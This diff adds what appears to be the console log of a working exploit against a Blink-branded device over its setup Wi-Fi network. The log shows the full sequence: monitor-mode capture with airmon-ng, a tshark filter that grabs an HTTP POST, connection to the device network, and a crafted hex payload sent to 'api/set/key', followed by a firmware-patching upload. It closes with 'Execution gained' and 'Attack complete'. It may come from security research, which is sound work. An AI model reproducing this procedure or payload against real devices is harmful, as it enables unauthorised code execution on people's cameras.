@@ -1,0 +1,72 @@
+sudo iw wlp0s20f3 scan | grep -ioE 'SSID: BLINK.*'
+[sudo] password for user: 
+waiting for blink network.
+Got ssid BLINK-72D8
+Attempting to enable monitor mode...
+sudo airmon-ng start wlp0s20f3 && sudo iwconfig wlp0s20f3mon mode monitor channel 6
+
+Found 4 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    616 avahi-daemon
+    636 NetworkManager
+    706 wpa_supplicant
+    740 avahi-daemon
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlp0s20f3	iwlwifi		14.3 Network controller: Intel Corporation Wi-Fi 6 AX201 (rev 20)
+		(mac80211 monitor mode vif enabled for [phy0]wlp0s20f3 on [phy0]wlp0s20f3mon)
+		(mac80211 station mode vif disabled for [phy0]wlp0s20f3)
+
+Monitor mode enabled
+
+Waiting for http POST
+sudo tshark -f "host 172.16.97.199 and port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354" -w - -c 1
+Running as user "root" and group "root". This could be dangerous.
+Capturing on 'wlp0s20f3mon'
+ ** (tshark:1589697) 13:59:54.754564 [Main MESSAGE] -- Capture started.
+ ** (tshark:1589697) 13:59:54.754613 [Main MESSAGE] -- File: "-"
+1 
+Got POST data: 1d35ac5c0b7d90f60bf82dfbc6d6a3af25e5cefba464e28cb87295b10cdd6a978a1d3e800a97ddc6e602ea0d3462b7cc
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlp0s20f3mon	iwlwifi		14.3 Network controller: Intel Corporation Wi-Fi 6 AX201 (rev 20)
+		(mac80211 station mode vif enabled on [phy0]wlp0s20f3)
+		(mac80211 monitor mode vif disabled for [phy0]wlp0s20f3mon)
+
+attempting to connect to BLINK-72D8
+Error: No network with SSID 'BLINK-72D8' found.
+Connection failed. A few of these while network card switches back from monitor mode is expected
+Error: No network with SSID 'BLINK-72D8' found.
+Connection failed. A few of these while network card switches back from monitor mode is expected
+Error: No network with SSID 'BLINK-72D8' found.
+Connection failed. A few of these while network card switches back from monitor mode is expected
+Error: No network with SSID 'BLINK-72D8' found.
+Connection failed. A few of these while network card switches back from monitor mode is expected
+Error: No network with SSID 'BLINK-72D8' found.
+Connection failed. A few of these while network card switches back from monitor mode is expected
+Device 'wlp0s20f3' successfully activated with '02dbb007-5160-4d80-abf4-f07380238ed5'.
+sending initial payload of length 0xb0
+POST api/set/key with:
+000000002000549671cf20000ffff004
+2010d920d804b81c6961100102841901
+012a71d720002000f5f97b00240a3f80
+200fc710220a3f8020063a0420200f80
+2004c8a62010d8cc200046a02000568c
+64646464200070162000568c2004ba44
+20036a1a2001cec02004ba682010d8c4
+00000000000000000000000055b342aa
+8a1d3e800a97ddc6e602ea0d3462b7cc
+6c88f708e01d5ad7fd1fc73255b74cfe
+8a1d3e800a97ddc6e602ea0d3462b7cc
+Got status code 200
+attempting to send 0xee380 bytes to execute & patch firmware
+Got status code 200
+Response text:
+Execution gained. Re
+Attack complete
